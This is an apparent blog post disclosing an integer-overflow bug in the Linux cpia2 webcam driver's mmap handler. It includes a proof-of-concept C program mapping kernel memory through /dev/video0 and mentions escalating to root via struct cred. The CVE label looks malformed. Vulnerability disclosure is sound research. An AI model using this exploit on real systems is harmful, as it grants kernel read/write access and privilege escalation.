@@ -1,0 +1,159 @@
+I"y><h2 id="description">Description</h2>
+<p>Recently I started to review the linux kernel , I’ve putted much  time and effort identifying vulnerabilities. 
+I was looking on the cpia2 driver , which is a V4L driver , aimed for controlling cpia2 based webcams, official documentation <a href="https://www.kernel.org/doc/html/latest/media/v4l-drivers/cpia2.html">here</a>
+Kernel drivers may re-implement their own mmap handlers , usually for speeding up the process of exchanging data between user and kernel space.
+That seemed like a great target to me , because a wrong implementation , can lead to a really bad situation, as we will se later.</p>
+
+<hr />
+
+<h2 id="lets-get-into-it">Lets get into it</h2>
+<p>Here is the userspace mmap function prototype (taken from man):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="nf">mmap</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span>
+                  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">off_t</span> <span class="n">offset</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The driver’s specific mmap handler will remap kernel memory to userspace using a function like <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-remap-pfn-range.html">remap_pfn_range</a></p>
+<h2 id="cve-18675">CVE-18675</h2>
+
+<p>Lets have a look at the cpia2 mmap handler implementation:</p>
+
+<p>As we can see in the file_operations struct:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cm">/***
+ * The v4l video device structure initialized for this device
+ ***/</span>
+<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">v4l2_file_operations</span> <span class="n">cpia2_fops</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="p">.</span><span class="n">owner</span>		<span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">open</span>		<span class="o">=</span> <span class="n">cpia2_open</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">release</span>	<span class="o">=</span> <span class="n">cpia2_close</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">read</span>		<span class="o">=</span> <span class="n">cpia2_v4l_read</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">poll</span>		<span class="o">=</span> <span class="n">cpia2_v4l_poll</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">unlocked_ioctl</span>	<span class="o">=</span> <span class="n">video_ioctl2</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">mmap</span>		<span class="o">=</span> <span class="n">cpia2_mmap</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Lets look at the function cpia2_mmap , which calls the function cpia2_remap_buffer():</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/******************************************************************************
+ *
+ *  cpia2_remap_buffer
+ *
+ *****************************************************************************/</span>
+<span class="kt">int</span> <span class="nf">cpia2_remap_buffer</span><span class="p">(</span><span class="k">struct</span> <span class="n">camera_data</span> <span class="o">*</span><span class="n">cam</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">adr</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_start</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_end</span><span class="o">-</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_start</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start_offset</span> <span class="o">=</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_pgoff</span> <span class="o">&lt;&lt;</span> <span class="n">PAGE_SHIFT</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">adr</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">page</span><span class="p">,</span> <span class="n">pos</span><span class="p">;</span>
+
+	<span class="n">DBG</span><span class="p">(</span><span class="s">"mmap offset:%ld size:%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">start_offset</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">video_is_registered</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cam</span><span class="o">-&gt;</span><span class="n">vdev</span><span class="p">))</span>
+		<span class="k">return</span> <span class="o">-</span><span class="n">ENODEV</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">cam</span><span class="o">-&gt;</span><span class="n">frame_size</span><span class="o">*</span><span class="n">cam</span><span class="o">-&gt;</span><span class="n">num_frames</span>  <span class="o">||</span>
+	    <span class="p">(</span><span class="n">start_offset</span> <span class="o">%</span> <span class="n">cam</span><span class="o">-&gt;</span><span class="n">frame_size</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span>
+	    <span class="p">(</span><span class="n">start_offset</span><span class="o">+</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">cam</span><span class="o">-&gt;</span><span class="n">frame_size</span><span class="o">*</span><span class="n">cam</span><span class="o">-&gt;</span><span class="n">num_frames</span><span class="p">))</span>
+		<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+	<span class="n">pos</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">cam</span><span class="o">-&gt;</span><span class="n">frame_buffer</span><span class="p">))</span> <span class="o">+</span> <span class="n">start_offset</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">page</span> <span class="o">=</span> <span class="n">kvirt_to_pa</span><span class="p">(</span><span class="n">pos</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">remap_pfn_range</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">page</span> <span class="o">&gt;&gt;</span> <span class="n">PAGE_SHIFT</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PAGE_SHARED</span><span class="p">))</span>
+			<span class="k">return</span> <span class="o">-</span><span class="n">EAGAIN</span><span class="p">;</span>
+		<span class="n">start</span> <span class="o">+=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+		<span class="n">pos</span> <span class="o">+=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">PAGE_SIZE</span><span class="p">)</span>
+			<span class="n">size</span> <span class="o">-=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+		<span class="k">else</span>
+			<span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">cam</span><span class="o">-&gt;</span><span class="n">mmapped</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>we can see start_offset + size is being calculated , and the sum is being compared to the totoal size of the frames.      <br />
+However, the calculation start_offset + size could wrap-around to a low value, allowing an attacker to bypass the check while still using a  big start_offset value which will lead to mapping of unintended  kernel memory. The only requirement is that the start_offset value will be a multiple of the frame_size (which can be controlled by the cpia2 driver options, by default its 68k).
+And this can be  quite bad because a huge offset will allow us to perform a mapping in an arbitrary offset (outside the bounds of the frame’s buffer)  , and this  can possibly result in  a privillege escalation</p>
+
+<p>This vulnerability is more than 8 years old!!</p>
+
+<h2 id="demo-time">Demo time!</h2>
+
+<p>I’ve used a qemu kernel virtual machine (<a href="">here</a>).
+Now we have to:</p>
+
+<ul>
+  <li>Open /dev/video0</li>
+  <li>mmaping size 0x11000 at offset 0xffffffffffff0000. The overlow will ocuur and we will pass the check :)</li>
+</ul>
+
+<p>Here is a minimalistic example for exploit code:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="cp">#define VIDEO_DEVICE "/dev/video0"
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+
+        <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">command</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+
+        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span>  <span class="n">open</span><span class="p">(</span><span class="n">VIDEO_DEVICE</span> <span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"[-]Error opening device file</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Demonstration</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[~]PID IS %d "</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+
+        <span class="n">getchar</span><span class="p">();</span>
+        <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span>  <span class="mh">0x11000</span><span class="p">;</span>
+        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mapStarter</span> <span class="o">=</span> <span class="mh">0x43434000</span><span class="p">;</span>
+        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span> <span class="n">mapped</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">mapStarter</span><span class="p">,</span>  <span class="n">size</span><span class="p">,</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_SHARED</span> <span class="p">,</span> <span class="n">fd</span> <span class="p">,</span> <span class="mh">0xffffffffffff0000</span><span class="p">);</span>
+
+
+        <span class="k">if</span><span class="p">(</span><span class="n">mapped</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"[-]Error mapping the specified region</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">else</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"[+]mmap went successfully</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="cm">/*view the /proc/&lt;pid&gt;/maps file */</span>
+
+        <span class="n">sprintf</span><span class="p">(</span><span class="n">command</span> <span class="p">,</span> <span class="s">"cat /proc/%d/maps"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+        <span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p>Compile and run:</p>
+
+<p><img src="/assets/img/alictf-2016/demo.png" alt="login" /></p>
+
+<p>and BOOM! we have got a read and write primitives in kernel space! By modifying <code class="highlighter-rouge">struct cred</code> or kernel function pointers/ variables we can possibly gain root! or destroy kernel data!</p>
+
+<h2 id="tips-and-thoughts">Tips and thoughts</h2>
+
+<ul>
+  <li>
+    <p>Because of I didnt have the required hardware (for example,  Intel Qx5 microscope ), I’ve made some changes in the driver’s code for this poc . I’ve removed all hardware stuff and operations , and switched all to default values . Because the vulnerability is not related to the hardware at all , this wasn’t a problem. 
+This way I could research more and even debug the interesting parts  without being depend on hardware.</p>
+  </li>
+  <li>
+    <p>Kernel research requires! besides of being so cool , it demends a lot of time and effort. The more one knows about the internals of the operating system he is research , the more likely he will find something interesting!</p>
+  </li>
+  <li>
+    <p>This is my first public vulnerability!</p>
+  </li>
+</ul>
+:ET
